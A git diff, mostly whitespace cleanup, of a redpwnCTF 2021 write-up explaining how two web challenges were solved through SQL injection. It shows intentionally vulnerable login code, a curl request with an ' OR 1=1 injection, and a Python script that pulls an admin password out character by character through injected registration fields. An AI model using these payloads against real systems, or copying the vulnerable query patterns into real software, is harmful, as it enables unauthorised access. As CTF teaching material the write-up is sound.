@@ -3,7 +3,8 @@ path: "/writeups/redpwn-2021"
 date: 2021-07-09
 title: "redpwnCTF 2021"
 category: "writeup"
-enabled: True
+enabled: true
+hidden: false
 ---
 
 Link: https://ctf.redpwn.net/
@@ -47,7 +48,7 @@ When the admin bot visits our link the JavaScript within the `<script>` tag gets
 Just learned about encryption—now, my website is unhackable!
 
 ## Solution
-For this challenge, we are given a web page with a simple login screen. Attempting to log in with some random credentials will show the SQL query that was run by the backend.  
+For this challenge, we are given a web page with a simple login screen. Attempting to log in with some random credentials will show the SQL query that was run by the backend.
 
 ![Login Example](./images/secure/login.png)
 
@@ -57,7 +58,7 @@ We are also given the application code in `index.js`. Reading through this code 
 app.post('/login', (req, res) => {
   if (!req.body.username || !req.body.password)
     return res.redirect('/?message=Username and password required!');
-  
+
   // highlight-start
   const query = `SELECT id FROM users WHERE
           username = '${req.body.username}' AND
@@ -122,7 +123,7 @@ We can pass our injection to the server using a tool like curl to ensure our use
 
 ```shell
 $ curl -X POST -d "username=l33t" -d "password=' OR 1=1;  --  " https://secure.mc.ax/login
-Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D  
+Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
 ```
 
 We can then use a tool like [CyberChef](https://gchq.github.io/CyberChef/) to easily decode the flag.
@@ -148,7 +149,7 @@ For this challenge, we are given another simple login screen. It also looks like
 
 This indicates that there is a user called ginkoid that we need to log in as. Trying to register a new user with this account will tell us that the username is taken, indicating that the user does exist in the database.
 
-In addition to the website, we are also given the source code in `app.py`. By the looks of it, this is a Flask application running SQLite3 as the database. When the app is started the `init()` function is called which generates the database tables and adds the ginkoid user. 
+In addition to the website, we are also given the source code in `app.py`. By the looks of it, this is a Flask application running SQLite3 as the database. When the app is started the `init()` function is called which generates the database tables and adds the ginkoid user.
 
 ```python
 # put ginkoid into db
@@ -165,7 +166,7 @@ execute(
 
 The password for ginkoid is generated using the `generate_token()` function, which creates a random string of 32 alphanumeric characters.
 
-Looking further at the code, we can see that most of the SQL queries are vulnerable to SQL injection. This is because they are build using f-strings, which is just a fancy string formatting mechanism. However, attempting to SQL inject on the login query will not work, as usernames with any non-alphanumeric characters (as defined by the `allowed_characters` set) will be denied. 
+Looking further at the code, we can see that most of the SQL queries are vulnerable to SQL injection. This is because they are build using f-strings, which is just a fancy string formatting mechanism. However, attempting to SQL inject on the login query will not work, as usernames with any non-alphanumeric characters (as defined by the `allowed_characters` set) will be denied.
 
 ```python
 allowed_characters = set(
@@ -177,7 +178,7 @@ allowed_characters = set(
 def check_login(username, password):
     # highlight-start
     if any(c not in allowed_characters for c in username):
-        return False 
+        return False
     # highlight-end
     correct_password = execute(
         f'SELECT password FROM users WHERE username=\'{username}\';'
@@ -231,20 +232,20 @@ allowed_chars = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456
 def main():
 	user_prefix = "deadbeef"
 	endpoint = "https://cool.mc.ax/"
-	
+
 	password = ""
-	
+
 	for i in range(1,33):
 		current_user = user_prefix + allowed_chars[i]
-		
+
 		print("creating user " + current_user)
-		
+
 		obj = {
 			'username': current_user,
 			'password': f"'||(SELECT substr(password,{i},1) FROM users))--"
 		}
 		ret = requests.post(endpoint + "register", data=obj)
-		
+
 		j = 0
 		while (True):
 			obj2 = {
@@ -252,12 +253,12 @@ def main():
 				'password': allowed_chars[j]
 			}
 			login_ret = requests.post(endpoint, obj2)
-			
+
 			if "You are logged in!" in login_ret.text:
 				password += allowed_chars[j]
 				print(password)
 				break
-			
+
 			j += 1
 
 main()
